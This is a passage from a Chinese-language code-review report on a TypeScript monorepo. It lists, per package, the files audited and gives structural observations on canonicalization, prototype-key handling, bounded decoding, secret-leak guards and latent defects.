pirSemanticGraphFacts, pirSemanticBindingFacts, pirSemanticContractFacts, pirBindingScope, pirBindingCandidate, pirCodeSlotProvider}.ts。packages/pir-react-renderer —— PIRRenderer.tsx、PIRRenderer.types.ts、document/PIRDocumentProjection.tsx、node/{PIRNodeProjection, PIRElementProjection}.tsx、collection/PIRCollectionProjection.tsx、component/{PIRComponentInstanceProjection, PIRSlotOutletProjection}.tsx、runtime/{pirProjectionRuntime, pirRenderScope, pirTriggerDispatch, pirDataOperationRuntime, reactProjection, pirRouteContext, routeDebug}.ts、host/{pirRendererHost, registry, iconRegistry, capabilities, hostReactImportMap}.ts。为验证候选发现项的可达性而阅读的分区外代码:packages/workspace/src/component/workspacePirProjection.ts、packages/workspace/src/authoring/createWorkspaceCodeSlotRegistryFromSnapshot.ts、packages/authoring/src/semantic/{semanticIds, semanticResolution, semanticDiagnostics}.ts、packages/prodivix-compiler/src/react/documentCompiler.ts(runtimeValuesById 的键)、apps/web/src/pir/pirWebRendererHost.tsx、apps/web/src/plugins/platform/extensionQueryService.tsx、apps/web/src/editor/features/blueprint/editor/controller/useBlueprintEditorController.ts(preview/host prop 稳定性)、packages/ui/src/container/PdxDiv.tsx。测试文件只做了略读而非逐行阅读;我对整个分区 grep 了禁用的耦合模式(querySelector/closest/parentElement/toMatchSnapshot/className),测试中未发现违规 —— 唯一的命中都出现在生产代码中(PIRNodeProjection 的边界命中测试与 routeDebug 的诊断计数器)。生成文件 codec/pirWire.generated.ts 仅被用作参考契约,以便与 pirCodec.ts 中手写的检查器做比对;没有针对它提出任何风格 / 重复方面的发现项。

**结构观察**: 总体来看该分区状态良好。以下是我核实为正确而非缺陷的具体区域,以免日后被反复争论:

- **Codec / migration**:`pirCodec.ts` 的手写检查器与 `pirWire.generated.ts` 逐字段一致(允许 / 必需的键集合、字面量种类、`command` 枚举、`idle` 枚举、collection 的 source/key 变体)。`canonicalize` 使用默认(与语言环境无关的)比较器对键排序,并在编码与解码两侧都会应用,因此 `encodePirDocument` 是确定性的,且 `decode(encode(x)) === x`。migration registry 具备完善的环路防护和迁移后的版本不匹配检查,而 v1.3→v1.4 的 migration 对遗留的 `$data`/`$item`/`$index`、`list`、`events`、`logic.graphs` 与 `animation` 正确地 fail closed,而不是静默丢弃语义。`inspectPirJsonStructure` 在任何递归之前就限制了深度 / 节点数,因此 `canonicalize` 不会因通过 `decodePirDocument` 传入的不可信输入而爆栈。

- **ui.graph 不变量**:`pirValidator.validateGraph` 覆盖了任务书中列出的全部四类隐患 —— 悬空的 child/owner 引用、多父节点、迭代式 DFS 环检测,以及 root 可达性(孤儿节点)。region owner 被限制为 Collection / Component-Instance 节点,Collection 的 region 名被限制为 `item|empty|loading|error`。`pirBindingValidator.ts` 中的词法可见性遍历器都带有 `visited` 集合,因此即使在有环的图上被调用也会终止(校验有意在环检测之后才运行绑定检查)。`pirExtractionGraph.ts` 中对应的孪生实现(`isPirNodeAncestorOrSelf`、`isPirCollectionSymbolVisible`)则是没有 visited 集合的无界 `while` 循环 —— 它今天之所以安全,仅仅因为 `analyzePirSubtreeExtraction` 会在构造分析器之前对任何图环问题做阻断。这是一个值得写进文档的隐式前置条件;如果这两个辅助函数中的任何一个被导出供直接使用,它们会让浏览器标签页卡死。

- **渲染器读投影的纯粹性**:没有任何路径会回写 plan。`WorkspacePirProjectionPlan` 文档在构造时被 `deepFreeze`,渲染器派生出的每个 scope 对象(`createPirDocumentScope`、`applyPirElementDataScope`、`withPirSlotProps`、`withPirProjectedValueScope`)都返回新的冻结对象。阻断性问题被累积在渲染器本地的 React state 中,以长度前缀化的位置标识为键,并在 `plan` 的身份变化时被正确丢弃。

- **key 稳定性**:`PIRNodeList` 以 `${document.id}:${nodeId}` 为 key(在一个列表内唯一),`PIRCollectionProjection` 以 `item.keyIdentity` 为 key,而 `projectPirCollection` 保证其不重复(重复会变成 `keyDuplicate` 阻断性问题)。`createPirCollectionKeyIdentity` 对类型敏感且带长度前缀,因此 `"1"` 与 `1` 不会碰撞。

- **值得跟踪而非现在修复的潜在(尚不可达)隐患:**
  1. `PIRCollectionProjection` 的 effect(第 183 行)以 `report(loc, [])` 做清理,随后又重新添加同样的问题。由于 `reportBlockingIssuesAt` 在删除和添加时都会返回一个*新的* state 对象,任何既有阻断性问题、其 `blockingIssues` 数组身份又在每次渲染时变化的 collection,都会在 `PIRRenderer` 中引发无限渲染循环。今天 `useBlueprintEditorController` 中的 `resolveCollectionPreviewState` 返回的是一个已存储的对象,且 `runtime.host.resolveCodeValue` 为 `undefined`,因此不动点成立 —— 但只要将来某个调用方返回全新的 preview 对象字面量,就会让编辑器卡死。当身份即将被重新上报时跳过清理(或仅在卸载时上报空集合)即可消除这一隐患。
  2. `BlueprintEditorCanvas.tsx:53` 使用 `hiddenLocations = []` 作为默认参数,这会在每次渲染时重建数组,而它又是 `PIRRenderer` 的 `runtime` 的 `useMemo` 依赖项。这会破坏下游所有的记忆化(今天不影响正确性,但正是它让隐患 1 更容易被触发)。
  3. `duplicatePirGraphSubtree` 会逐字复制 `call-code` 触发器,包括作者拥有的 `slotId`。`createPirCodeSlotProvider` 同时以该 id 作为 `slotsById` 与 `bindingsById` 的键,因此两个共享同一 `slotId` 的节点会静默塌缩为一个 owner,并丢失一个绑定投影。目前没有任何 UI 会创作 `call-code` 触发器,所以这不可达 —— 但只要该创作路径落地,它就会成为真正的归属缺陷。挂载式 CSS 的 slot id 由 `documentId + nodeId` 派生,是安全的。
  4. `pirSemanticBindingFacts.addTriggerReference` 输出的 `runtime-value` 数据输入引用带有默认的 `resolutionMode: 'addressable'` + `requiresDurableTarget: true`,而 `pirSemanticGraphFacts.addInputReference` 输出语义上等价的 fact 时用的是 `resolutionMode: 'visible'` 且没有持久化目标要求。同一个概念存在两个归属者、两套策略。我无法构造出一个确定错误的用例(元素拥有的 `data` 符号是 `revision-scoped` 的,也不出现在编译器的 `runtimeValuesById` 中,因此拒绝它们可能是有意为之),所以没有作为发现项提交 —— 但这种不对称应当以某种方式被明确下来。

- **原型键的处理纪律在该分区内并不一致。** 发现 1 与发现 4 是两个可达实例,但同样的模式(在没有 `Object.hasOwn` 的情况下使用 `record[authorControlledKey]`)也良性地出现在 `pirBindingValidator.ts:235/443`、`pirValidator.ts:691`、`pirBindingScope.ts:141` 与 `pirExtractionValueBoundary.ts:82/111/125`。它们都会 fail closed(产出诊断而不是崩溃),但代码库中已经存在正确的写法(五个文件里定义了 `hasOwn` 辅助函数),只需一条禁止对 `Record<string, T>` 字典使用计算成员访问的 lint 规则,就能封闭整类问题。

### 5.16 `pkg-runtime-core` — packages/runtime-core

**覆盖范围**: 作为生产源码完整阅读了 packages/runtime-core/src 下全部 28 个非测试文件:executionTerminalEmulator.ts(1220 行)、executableProjectNormalization.ts(1138)、executionTestReport.ts(860)、executionConsole.ts(771)、executionSession.ts(697)、executionEnvironmentResolution.ts(593)、executableProject.ts(580)、executionJob.ts(567)、executionTerminalController.ts(525)、executionTerminalCheckpoint.ts(505)、executionTerminal.ts(488)、executionFilesystemDiff.ts(464)、index.ts(406)、executionNetworkTrace.ts(402)、executionSecretLeakGuard.ts(399)、executionDataStreamBridge.ts(387)、execution.types.ts(375)、executableProject.types.ts(290)、executionRequest.ts(275)、executionDataGatewayBridge.ts(273)、executionBuildBundle.ts(183)、executionProviderRegistry.ts(161)、executionEnvironment.ts(124)、executionTerminalControllerSupport.ts(102)、executionRecovery.ts(90)、executionPreviewBundle.ts(82)、runtimeExecutorRegistry.ts(69)、executionFilesystemDiff.types.ts(69)、runtimeExecution.ts(36)。

略读了 src/**tests** 下的 22 个测试文件以还原预期语义(尤其是 executionTerminalEmulator.property.test.ts、executionSecretLeakGuard.test.ts、executionEnvironmentResolution.test.ts、executableProject.property.test.ts)。追踪了两条分区外调用路径以确认可达性:apps/web/src/editor/features/execution/useRemoteExecutionTerminal.ts(emulator 的 consume/gap 接线)与 packages/runtime-browser/src/browserProjectRunner.ts + packages/runtime-remote/src/remoteExecutionProvider.ts(emitLog 的量级)。有一项分区外检查我未能完成:我在 apps/remote-runner-control-plane 与 apps/remote-runner-worker 中 grep 了基于序列化 ExecutionRequest 计算的摘要 / 幂等键,未找到任何一处,因此发现 5 的范围限定在 wire/日志可复现性,而非已证实的哈希不匹配。

用一个独立的单文件 Node 探针(非项目代码)对 ECMA-402 语义做了实证,验证了发现 1 中关于 localeCompare 排序规则的说法:在本机的 ICU root collation 中,NUL 被完全忽略,而复合排序键确实会拆分 `field` 相等的条目。

**结构观察**: 总体来看该分区状态良好,重点关注的区域在细读之下都站得住脚。

executionTerminalEmulator.ts(体量最大、风险最高的文件)是可靠的。我专门排查了缓冲区越界和无界增长,均未发现:每个 CSI 参数在索引前都经过 `clamp()`(`insertLines`/`deleteLines`/`insertCharacters`/`deleteCharacters`/`eraseCharacters`/`scrollUp`/`scrollDown`);`parserValue` 在三个累积状态中都有上界(csi 256、osc 1024、osc-escape 带 +2 预检),而 DCS/APC/PM 的 `ignored-string` 状态完全不累积;`retainScrollback` 在每次 push 时都会重新截取到 `maximumScrollbackRows`;宽字符 / 组合字符的单元格处理会正确跨过宽度为 0 的续接单元格;OSC 处理只接受命令 0/2,并从标题中剥离 C0/DEL;被 SGR 隐藏的单元格在 `toPublicLine` 与复制投影中都被替换为空格。`gapAlreadyProjected` 闩锁乍看像去重缺陷,但它是正确的:它的存在是为了让显式的 `input.gap` 标志与游标不连续检查(`record.cursor > latestOutputCursor + 1 && (latestOutputCursor > 0 || !gapAlreadyProjected)`)不会为同一次不连续同时发出标记,而后续的间隙仍会被游标路径捕获。

executionSecretLeakGuard.ts 构造良好 —— 对 artifact 字节使用 Aho-Corasick 字节匹配器,不回显命中的值或偏移量,在遇到访问器 / 异常原型 / symbol 时 fail closed 为 'uninspectable',流式脱敏器在分块边界处仅保留最长的 secret 前缀后缀,并配有严格校验的检查点。两条低于阈值的注记:(a)`minimumSecretLength = 4` 会静默丢弃更短的受保护值,因此仅由短 secret 构造出的 guard 实际上是失效的,而调用方却以为受到了保护;(b)`longestSecretPrefixSuffix` 每次 `push()` 的复杂度是 O(secretLen^2),而 `maximumSecretBytes` 允许单个 64 KiB 的 secret,这会让每次 chunk push 变成平方级 —— 就现实输入而言,两者今天都不可达。

executionFilesystemDiff.ts 的限界是正确且分层的:在 `JSON.parse` 之前有载荷字节上限、有单文件上限、有累计内容上限、有变更计数上限;严格的规范 base64 并做重新编码的往返校验;内容摘要是重新计算而非直接信任;规范的 `changeId` 会被重新计算并比对;路径经过 `normalizeExecutableProjectPath`(拒绝绝对路径、反斜杠、盘符、`.`/`..`、未规范化的路径段),并要求按代码单元比较严格升序排列。

Ports/registry 的生命周期(`createExecutionProviderRegistry`、`createRuntimeExecutorRegistry`)由实例自身拥有,注销闭包带有身份校验,不存在跨实例状态;`createExecutionTerminalController` 通过一条不会吞掉 rejection 的 `enqueue` 尾链把 write/resize/signal/close 串行化,幂等指纹经过加盐、有界并按插入顺序淘汰。

两项我判断低于上报门槛的条目:`executableProject.ts` 只针对三条保留的运行时投影路径校验精确路径冲突,因此在 `public/.prodivix` 处创作的项目文件(该位置必须是目录)能通过校验,并产生自相冲突的 `projectExecutableProjectRuntimeFiles` 输出;另外 `createExecutionConsoleSnapshot` 会跳过超大记录但继续扫描更旧的记录,因此在字节预算接近用尽时可能丢弃较新的记录却保留较旧的(由于设置了 `truncated` 标志,这也可能是有意为之)。

### 5.17 `pkg-runtime-remote` — packages/runtime-remote (+ postgres, browser, vitest)

**覆盖范围**: 完整阅读:packages/runtime-remote/src —— remoteExecutionProvider.ts、remoteExecutionControlPlane.ts、remoteExecutionControlPlaneMemory.ts、remoteExecutionClient.ts、remoteExecutionRecovery.ts、remoteExecutionRegionalRecovery.ts、remoteExecutionRegionalRecoveryOperator.ts、remoteExecutionRegionalRecoveryOperator.types.ts、remoteExecutionRegionalRecoveryEvidence.ts、remoteExecutionTerminalBroker.ts、remoteExecutionTerminalBrokerSupport.ts、remoteExecutionTerminalWorkerBroker.ts、replicatedRemoteExecutionTerminalBroker.ts、replicatedRemoteExecutionTerminalBrokerSupport.ts、remoteExecutionTerminalState.ts、remoteExecutionTerminalStateCodec.ts、remoteExecutionTerminalClient.ts、remoteExecutionTerminalHttpTransport.ts、remoteExecutionHttpTransport.ts、remoteExecutionArtifactResolver.ts、remoteExecutionSecretEnvelope.ts、remoteExecutionServerAuthority.ts、remoteExecutionEventCodec.ts、remoteExecutionRequestCodec.ts、remoteExecutableProjectCodec.ts、remoteExecutionCodecPrimitives.ts(关键段落)、remoteExecutionResponseCodec.ts(信封关联校验)。packages/runtime-remote-postgres/src —— 全部五个适配器,以及 postgresTransaction.ts 和 traffic-authority 迁移 DDL。packages/runtime-browser/src —— browserProjectRuntimeHost.ts、browserProjectRunner.ts、browserProjectTestRunner.ts、browserProjectRuntime.ts、browserProjectFileTree.ts、browserNetworkAdapter.ts、browserAnimationEffectStore.ts。packages/runtime-vitest/src —— vitestExecutionTestReport.ts。交叉核对了 runtime-core 的执行作业状态转换表,以及 apps/remote-runner-control-plane 中的接线(regionalRecoveryOperatorJob.ts、main.ts、httpHandler.ts),仅用于确认哪些 broker/限额会进入生产。浏览了范围内所有 *.test.ts 以了解其预期语义;没有违反 DOM/snapshot 测试策略的,也没有缺少断言的。未深入覆盖:remoteExecutionProtocolCodec.ts、remoteExecutionTerminalCodec.ts / TerminalCodecSupport.ts / TerminalWorkerCodec.ts、remoteExecutionRegionalRecoveryOperatorCodec.ts 和 animationPreview.ts(仅阅读结构,未发现缺陷);Postgres 集成测试未执行(仅静态审查)。

**结构观察**: 总体来看,这个分区异常严谨:几乎每一条面向远端的解码路径都会带着显式的身份/游标/摘要交叉校验 fail closed,token 比较使用常数时间摘要比对,密钥材料在进入存储或证据记录之前都会一致地被归约为摘要。未发现任何密钥泄漏到日志/snapshot/证据的路径;`remoteExecutionRegionalRecoveryOperator.types.ts` 和 `postgresRegionalRecoveryOperatorGrantStore.ts` 有意将证明字节同时排除在证据模型和 Postgres 之外。

值得关注的热点:

- 规范化被实现了四次,规则略有差异:使用 `localeCompare` 的 `stableJson`(remoteExecutionRegionalRecoveryOperator.ts:50、remoteExecutionRegionalRecoveryEvidence.ts:14、remoteExecutionRegionalRecoveryOperatorCodec.ts:16),对比使用纯 `Object.keys().sort()` 的 `stableJson`(runtime-remote-postgres/src/postgresRegionalRecovery.ts:64),再对比使用 JSON.stringify replacer 的 `canonicalJson`(remoteExecutionProvider.ts:194、postgresExecutionRepository.ts:66)。这三种语义中有两种彼此不兼容;把它们合并成一个导出的辅助函数可以消除一整类摘要不匹配的缺陷。
- `createPostgresRemoteExecutionRegionalTrafficAuthority.acquire`(postgresRegionalTrafficAuthority.ts:248)返回的 permit 会一直持有一个打开的事务、一个连接池客户端和一把共享 advisory lock,直到 `release()` 被调用为止,既没有超时也没有中止路径。调用方一旦丢弃 permit,就会永久阻塞该部署未来所有的独占切换。契约本身是正确的,但非常锋利;连接级的 `idle_in_transaction_session_timeout` 或一个看门狗可以让它在构造上就是安全的。
- `decodeRemoteExecutionEventsResult`(remoteExecutionEventCodec.ts:434)没有限制顶层 `events` 数组的长度,尽管 `REMOTE_EXECUTION_PROTOCOL_LIMITS.maxArrayEntries` 限制了每一个嵌套数组,因此被攻陷或有缺陷的 runner 可以迫使客户端进行无界分配。考虑到 runner 是半可信的,可达性较低,但这是一个在其他方面完全有界的编解码器上唯一的漏洞。
- `createRemoteExecutionClient` 在客户端的整个生命周期内保留 `identitiesByExecution` 和 `digestByRequest`(remoteExecutionClient.ts:256-266),进入终态时不做淘汰;条目很小,所以这属于增长而非泄漏,但在长期存活的编辑器会话中是无界的。
- `replicatedRemoteExecutionTerminalBroker.sweepExpired` 按设计吞掉每一条记录级的错误("Authenticated state failures require operator review, not deletion")。这可以辩护,但意味着持续性的密码/KMS 故障会静默地停止所有 Terminal GC,而不会暴露任何计数器或诊断。
- `apps/remote-runner-control-plane`(分区之外)是这些适配器唯一的生产接线;那里选定的 operator/terminal 默认值正是使发现 #1 可达的原因,因此任何修复都应针对 `regionalRecoveryOperatorJob.ts` 进行验证。

### 5.18 `pkg-server-assets-tokens` — server-runtime, assets, tokens, themes

**覆盖范围**: 完整阅读(生产源码):packages/server-runtime/src/{serverRuntimeKernel,serverRuntimeBridge,serverRuntimeProfile,serverRuntimeTrace,serverRuntimeAuthConfiguration,serverRuntimeTest,serverRouteAction,isolatedServerRuntime,serverRuntime.types,index}.ts;packages/assets/src/{binaryAsset,binaryAsset.types,binaryAssetPipeline,pngAsset,jpegAsset,binaryAssetGitProjection,binaryAssetGitProjection.types,index}.ts;packages/tokens/src/{dtcgDesignTokenCodec,dtcgDesignTokenResolverCodec,designTokenResolutionPlan,designToken.types,designTokenResolver.types,designTokenSemanticContributionProvider,designTokenResolverSemanticContributionProvider}.ts;packages/themes/src/{css/createCssVariables,css/createThemeStyleText,tokens/tokenPaths,tokens/defaultFallback,resolver/detectTokenCycles,resolver/resolveTokenReferences,resolver/resolveThemeManifest,fonts/themeFontRegistry,validation/validateThemeManifest,index}.ts 以及两个构建脚本。浏览了这四个包的测试套件(未发现 querySelector/closest/parentElement/snapshot 的用法 —— 对这些模式执行 `git grep` 没有任何结果)。追踪了分区外的调用路径以确认可达性:packages/authoring/src/semantic/{semanticIds,semanticFacts}.ts、packages/workspace/src/authoring/createWorkspaceSemanticIndexFromSnapshot.ts、packages/workspace/src/workspaceServerRuntimeAuthoring.ts、apps/web/src/theme/themeRuntime.ts。用 node 实证验证了两个 JS 语义论断(在普通对象上赋值 `__proto__`,以及 `aa` 与 `z` 在 `localeCompare` 上的 locale 差异)。未深入覆盖:四个官方 theme manifest JSON 文件和调色板 JSON(仅数据)、生成的 `.resolver.json` schema 文件,以及属性测试的生成器(仅阅读意图,未逐行审计)。

**结构观察**: 总体而言,这个分区异常严谨。server-runtime 的解码器(`serverRuntimeBridge`、`serverRuntimeTrace`、`isolatedServerRuntime`)使用精确键的记录匹配、有界的深度/节点/字节预算,以及严格的身份重新推导(`requestId === invocationId:attempt`);trace 格式在构造上只含元数据,并在读取时重新校验,因此我没有发现任何密钥泄漏进 trace、snapshot 或 bridge 的路径。`executeServerFunction` 正确地在 `finally` 中撤销环境租约并把 `secretMaterials` 清零,并在返回前扫描已校验的结果中是否含有密钥子串。

以下热点本身尚不构成缺陷,但值得留意:

- 规范化比较器在整个分区内不一致。`serverRuntimeAuthConfiguration.ts`、`binaryAssetGitProjection.ts`、`dtcgDesignTokenCodec.ts` 以及两个 token 语义提供者使用显式的代码单元 `compareText`;而 `serverRuntimeProfile.ts`、`serverRouteAction.ts`、`serverRuntimeTest.ts`(`canonicalJson`)和 `designTokenResolverSemanticContributionProvider` 的输入使用 `localeCompare`。其中只有 serverRuntimeProfile 那一处会到达持久化字节(已上报),但这种分裂是长期存在的陷阱。
- 若干以作者可控名称作索引的映射是普通 `{}` 对象而非 null 原型映射:`functionsByExport`(已上报)、`designTokenResolutionPlan.ts:114` 中的 `selection`,以及 `createCssVariables.ts:95` 中的 `tokens[referencePath]`。后两者目前是 fail closed 的(命中 `constructor`/`__proto__` 会得到不匹配的上下文或非字符串值),但这种写法距离真正的绕过只差一次重构。`binaryAsset.ts:228` 中的 `canonicalizeTransformValue` 用 `Object.create(null)` 做对了这一点。
- `packages/assets` 的图像解析器是这里最强的代码:有界的 chunk/segment 计数、CRC 校验、显式的 `chunkEnd > input.byteLength` 守卫、对非默认 EXIF 方向 fail closed,以及流水线和结构扫描器中逐字节精确的规范化往返校验。我没有发现越界或差一错误。
- `createServerRuntimeTestSession` 在 `invocationId` 下缓存的是失败变更的 _promise_,因此重试会重放失败而不是重新执行;而且 `dispose()` 不会清除 `waitForFixture` 中挂起的 `setTimeout`(最多留下 60 s 的悬空定时器)。对于一个确定性的 fixture 测试装置来说,这两点看起来都是有意为之,因此我没有立项。
- `themes` 包的校验关口(`validateThemeManifest`)只做结构/类型检查;它是 `<style>` 元素之前唯一的关口,却不约束 token 值中的 CSS 语法,也不约束未知的 token 路径。今天只有官方 manifest 通过 `applyThemePreference` 接入,所以影响面还处于潜伏状态 —— 但 `applyThemeManifest`、`createCssVariables` 和 `createThemeStyleText` 都是公开的,而 `ThemeSource` 声明了 `custom`/`community`。

### 5.19 `pkg-data` — data packages (core + http/graphql/asyncapi/mock)

**覆盖范围**: 完整阅读:packages/data/src(data.types.ts、dataDocument.ts 2357 行、dataRuntime.ts、dataDispatchRuntime.ts、dataCacheRuntime.ts、dataOptimisticRuntime.ts、dataStreamRuntime.ts、dataPolicyRuntime.ts、dataLifecycleChannel.ts、dataEnvironmentRuntime.ts、dataIdempotencyRuntime.ts、dataIncrementalCollectionRuntime.ts、dataJsonRuntime.ts、dataSchemaValidator.ts、dataSemanticContributionProvider.ts、dataAuthoring.ts、dataOperationTest.ts、dataWireCodec.ts、index.ts);packages/data-http/src(dataHttpAdapter.ts、dataOpenApiImporter.ts 2083 行);packages/data-graphql/src(dataGraphqlAdapter.ts、dataGraphqlImporter.ts);packages/data-asyncapi/src(dataAsyncApiAdapter.ts、dataAsyncApiImporter.ts);packages/data-mock/src(dataMockRuntime.ts)。交叉核对了两个分区外文件以验证调用契约:packages/runtime-core/src/executionEnvironmentResolution.ts(readPublicBinding/useSecret 的租约字段匹配)与 apps/web/src/editor/features/execution/browserDataExecutionEnvironment.ts(dispatch 协调器的生命周期)。测试被浏览以了解其预期语义,并扫描了被禁止的耦合模式(querySelector/closest/parentElement/snapshots)—— 均未发现;全部 21 个测试文件都有断言。未覆盖:DataHttpTransport / DataGraphqlStreamTransport / DataAsyncApiStreamTransport 背后的传输实现(仓库中不存在流式变体的实现),以及 Ajv 对用户提供的 `pattern` 关键字的内部正则处理。

**结构观察**: 本分区的密钥处理总体正确,符合不变量 7:配置密钥始终只是 `secret-ref` 绑定(三个协议适配器中的 `secretConfiguration` 都拒绝其他形式),密钥材料只在回调绑定的 `environment.useSecret(...)` 内部获取,并且只放入请求局部的 `headers` 记录中;`hasSecretConfiguration` 对未分区的缓存强制 `bypass-private`(dataCacheRuntime.ts:313),`parseBindings` 在 client/worker 区域拒绝 secret-ref(dataDocument.ts:486),OpenAPI 导入器拒绝把需要认证的操作导入 client 区域(第 1479 行)。幂等键是不含任何密钥输入的 SHA-256 摘要。没有任何密钥值到达 snapshot、trace、摘要或文档。

重复的归属:`safeHeaderName` 被实现了两次,保留头列表相同 —— `packages/data-http/src/dataHttpAdapter.ts:457`(以导出的 `DATA_HTTP_RESERVED_HEADER_NAMES` 为支撑)与 `packages/data-http/src/dataOpenApiImporter.ts:834`(硬编码数组),尽管导入器在第 803 行做参数检查时已经引入了那个导出的集合。二者今天是一致的,因此这种分歧是潜在的而非现行的缺陷。

确定性:`packages/data-mock/src/dataMockRuntime.ts:154` 用 `left.localeCompare(right)` 对对象键排序,而分区内其他所有模块都使用代码单元的 `compareDataText`。因此 fixture 的匹配键(`jsonIdentity`)依赖 locale 排序规则;对于规范等价但不相同的键(NFC 与 NFD),比较器返回 0,稳定排序的插入顺序就会泄漏进 identity 字符串,从而可能让某个 fixture 无法被匹配。我没有把它列为发现,因为实际触发条件非常狭窄,但仍值得与 `compareDataText` 对齐。

潜在隐患,仓库内暂无触发点:`packages/data-graphql/src/dataGraphqlAdapter.ts:849` 以分离的方法引用形式返回 `close: upstream.close`,于是 `dataStreamRuntime.terminate` 中的 `protocolStream.close(reason)` 会以包装对象作为 `this` 来调用它。AsyncAPI 的同类实现(dataAsyncApiImporter 的适配器,第 656-665 行)正确地把它包进了 `closeUpstream` 闭包,该闭包还会记忆化 close 的 promise 并在生成器的 `finally` 中关闭。仓库中尚不存在 `DataGraphqlStreamTransport` 实现,因此目前不可达。

无用的联合成员:`DataStreamSessionSnapshot.status` 声明了 `'opening'`(dataStreamRuntime.ts:80),但会话是直接初始化为 `'open'` 的(第 233 行),从未经过该状态。

架构不变量:这些包中没有任何代码写入 Workspace VFS 或 localStorage。缓存、乐观投影、mock 集合与流会话状态全部由实例拥有、有界且可丢弃;导入器只返回提案,从不采纳。`DataSourceDocument` 有意不设版本字段,数值型 `wireVersion` 被限制在 `dataWireCodec.ts` 内,符合不变量 1、3、5 和 6。

### 5.20 `pkg-authoring-lang` — authoring, code-language, diagnostics

**覆盖范围**: 用 `git ls-files` 枚举了该分区(97 个文件,packages/authoring、packages/code-language、packages/diagnostics 合计约 16.7k 行)。

完整阅读(生产源码):

- packages/authoring/src/semantic/: createWorkspaceSemanticIndex.ts, semantic.types.ts, semanticResolution.ts, semanticFacts.ts, semanticFactValidation.ts, semanticSnapshotIdentity.ts, semanticDiagnostics.ts, semanticOrder.ts, semanticIds.ts, semanticContributionProviderRegistry.ts, codeReferenceSemantic.ts, assetReferenceSemantic.ts, index.ts
- packages/authoring/src/: authoring.types.ts, codeAuthoring.ts, codeArtifactLifecycle.ts, codeRefactorImpact.ts, codeSlotRegistry.ts, codeSlotSemanticRelations.ts, codeArtifactProviderRegistry.ts, authoringDiagnosticProviderRegistry.ts, controlledSource.ts, dataOperationReference.ts, index.ts, diagnostics/semanticDiagnosticRegistry.ts, diagnostics/codeDiagnosticRegistry.ts(抽样)
- packages/authoring/src/language/: codeLanguage.types.ts, codeLanguageProviderRegistry.ts, codeLanguageSnapshotIdentity.ts, codeSourceSpan.ts, index.ts
- packages/authoring/src/compile/: shaderCompile.types.ts, shaderCompileProfile.ts, shaderCompileProviderRegistry.ts, index.ts
- packages/code-language/src/: typescriptCodeLanguageProvider.ts, typescriptProject.ts, typescriptProjectHost.ts, typescriptSemanticContribution.ts, cssCodeLanguageProvider.ts, cssLanguageProject.ts, cssSemanticContribution.ts, codeLanguageSemanticIds.ts, index.ts, wgsl-reflect-browser.d.ts, shader/{shaderCodeLanguageProvider,shaderSemanticContribution,shaderLanguageProject,shaderLanguage.types,wgslLanguageAnalyzer,glslLanguageAnalyzer,shaderCompileCapabilityProvider}.ts, shader/shaderLanguageVocabulary.ts(部分)
- packages/diagnostics/src/: diagnostic.types.ts, diagnosticIssue.types.ts, diagnosticIssueCollection.ts, buildDiagnosticPresentation.ts, diagnosticShared.ts, diagnosticRegistry.ts, createDiagnostic.ts, isDiagnostic.ts, index.ts, catalogs/uxDiagnosticRegistry.ts(抽样)

已阅读的测试:authoringRegistries.test.ts, codeLanguageProviderRegistry.test.ts, codeRefactorImpact.property.test.ts, typescriptProject.test.ts, diagnostics.contract.test.ts。

仅为确认分区内缺陷可达性而查阅的跨分区文件(未做审计):apps/web/src/editor/features/code/CodeAuthoringWorkspace.tsx(重命名关口)、packages/pir/src/authoring/pirSemanticBindingFacts.ts 与 pirCodeSlotProvider.ts(引用事实 / 槽位投影 id 的构造)、packages/workspace/src/authoring/workspaceSemanticContributionProvider.ts(code-artifact 作用域归属者)。

未深入覆盖:其余属性测试(codeAuthoring、codeArtifactLifecycle、controlledSource、workspaceSemanticIndex、cssSemanticContribution、shaderSemanticContribution、typescriptSemanticContribution、shaderCompile、codeLanguage)只是浏览了预期语义而非逐行阅读;660 行的 uxDiagnosticRegistry 与 321 行的 codeDiagnosticRegistry 目录做了抽样而非通读(它们是声明式的代码/标题表)。

**结构观察**: 总体而言,这个分区状况良好。revision/provider-set 绑定是其中最强的部分:`createSemanticSnapshotIdentity` 把 workspaceId/workspaceRev/routeRev/opSeq/各文档 rev 以及一份排序后的 provider 描述符摘要折叠成一个 identity,所有查询面都经由 `getStaleResult` 汇聚,并且索引只有在 `collectCanonicalSemanticFacts` + `validateCanonicalSemanticFacts` 零问题通过之后才会构建,因此绝不会暴露部分完成或过期的投影。作用域环检测在索引存在之前就已运行,这正是 `createScopeRanks`(semanticResolution.ts:45)中那个无界 `while (currentId)` 遍历得以安全的原因。

确定性纪律在 authoring/code-language 中是一致的:每个集合都用代码单元比较器排序(`compareSemanticText` / `compareText` / `compareShaderText`),映射按排序顺序重建,`Object.freeze` 被积极使用。唯一打破这一模式的地方是 `packages/diagnostics`(`localeCompare`、`toLocaleLowerCase`)—— 已在上文上报。

语言提供者的生命周期:`createCodeLanguageProviderRegistry` 与 `createShaderCompileProviderRegistry` 都是先完成全部校验再改动状态,因此被拒绝的注册不会留下部分状态。会话释放是统一的 —— 每个会话的 `blocked()` 都先检查 `disposed`,而 TS 会话还会额外检查 `projectLease.isCurrent()`。

有两处更应视为风险而非缺陷:

1. 共享可变的 TypeScript 工程。`defaultTypeScriptCodeProjectHost` 是模块级单例,而 `acquire()` 会在这个 _共享的_ 按 workspace 划分的工程上调用 `entry.project.updateArtifacts(...)`,从而抬升 `generation` 并使其他所有仍然存活的租约失效。`createTypeScriptSemanticContributionProvider`(typescriptSemanticContribution.ts:511-526)会用 canonical 制品去获取同一个租约,因此每一次 semantic-index 重建都会把打开的编辑器草稿会话翻转为 `status: 'unavailable'`,直到新开一个会话为止。这是有意为之的保护,但这种耦合很容易被改坏。另外注意 `prune()`(typescriptProjectHost.ts:69-79)只能淘汰 `activeLeaseCount === 0` 的条目;一旦某个消费者忘记调用 `session.dispose()`,该 workspace 的 `ts.LanguageService` 就会被钉死在进程的整个生命周期内。

